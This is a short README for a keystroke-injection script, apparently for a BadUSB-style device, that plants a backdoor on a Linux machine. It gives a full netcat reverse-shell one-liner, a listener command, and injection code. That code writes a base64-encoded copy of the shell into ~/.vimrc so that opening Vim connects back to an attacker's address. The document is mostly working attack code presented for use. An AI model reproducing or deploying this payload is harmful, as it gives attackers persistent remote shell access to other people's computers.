# Linux - VIM Config Netcat Backdoor

## Description

A simple backdoor that execute a base64 encoded netcat reverse shell embedd into a VIM Config file. Run VIM execute the reverse shell.

## Requirement

1. First note this script has been created and tested under Kali Linux 2021.2 as target.
2. I used a QWERTZ keyboard to do this ("ch" layout), so you may need to change that.
3. Take the netcat reverse shell of pentest monkey (or whatever) and encode it to base64 using <a href="https://www.base64encode.org/">this site</a>. Then replace the base64 string into the code. I used the netcat reverse shell bellow.
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```
5. Start a netcat listener in you'r attacker box.
```bash
nc -nvlp 1234
```

NOTE : I suggest to use the website to encode in base64, because trying to do it in zsh terminal on kali truncated the base64 in two line. But of course, you can do it by the way that you want since it work.

## Code

```bash
layout("CH");
typingSpeed(1, 2);
press("CTRL ALT T")
delay(1000)
type("echo '!base64 -d <<< cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgMTkyLjE2OC4xLjEwMyAxMjM0ID4vdG1wL2Y= | sh' > ~/.vimrc")
press("ENTER")
delay(1000)
type("exit")
delay(1000)
press("ALT F2")
delay(1000)
type("vim wootwoot")
press("ENTER")
```